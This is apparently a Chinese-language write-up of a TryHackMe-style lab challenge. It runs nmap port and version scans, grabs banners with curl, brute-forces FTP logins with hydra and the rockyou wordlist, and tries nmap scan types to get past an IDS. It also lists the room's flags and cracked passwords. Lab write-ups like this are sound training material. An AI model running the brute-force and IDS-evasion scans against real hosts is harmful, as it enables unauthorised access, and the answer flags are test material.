# 挑战赛room

使用此挑战来测试您对网络安全模块中获得的技能的掌握程度。这个挑战中的所有问题都可以只使用，和来解决。nmap,telnet,hydra


### 1.靶机打开的小于10000的最大端口是？

    nmap -sS -p1-9999 10.10.29.30

答案是8080

### 2.有一个开启的端口高于10000，请问是哪个？

    nmap -sS -p10000-65535 10.10.29.30

答案是10021

### 3.藏在http服务标头的flag是什么？

上面的扫描可知，http服务监听到80端口，直接访问即可：

    curl 'http://10.10.29.30:80' -v

THM{web_server_25352}

### 4.SSH服务器标头中隐藏的flag是什么？

直接通过nmap探测服务

    nmap -sV 10.10.29.30 --version-all

THM{946219583339}

### 5.我们有一个在非标准端口上侦听的 FTP 服务器。FTP 服务器的版本是什么？

我们刚刚扫端口的结果中只有10021是未知的

    nmap -sV -p10021 10.10.29.30

vsftpd 3.0.3

### 6.我们使用社交工程学学习了两个用户名：eddie和quinn。通过 FTP 访问, 隐藏在这两个帐户文件之一中的flag是什么？

用hydra挨个爆，然后登录ftp找flag

    hydra -l eddie -P /usr/share/wordlists/rockyou.txt 10.10.29.30 ftp -s 10021

eddie的密码：jordan，登录ftpdir啥也没有，继续爆下一个。

quinn的密码：andrea

登录ftp：

    ftp quinn@10.10.29.30 10021

    > dir
    看到ftp_flag.txt
    > get ftp_flag.txt ./flag
    > bye

然后读取./flag得到：THM{321452667098}

### 7.浏览显示一个小挑战，一旦你解决了它，它就会给你一个flag。flag是什么？http://10.10.29.30:8080

进入网页，发现：

    你的任务是使用Nmap扫描10.10.29.30（这台机器）
    尽可能隐蔽，避免被IDS检测到。

我一开始想到是空闲扫描，然后开始尝试扫全网10.10.0.0/16存活主机看看有没有什么发现，结果扫出确实是扫出了全网存活的主机，数都数不过来。

然后尝试其他tcp FLAGS置位的数据包

    nmap -sA、-sW、-sS、-sT 、-sF、-sX -sN
    nmap --scanflags <FLAGS>

都尝试了个遍之后发现tcp Null flag不会被IDS检测到，-sN

THM{f7443f99}
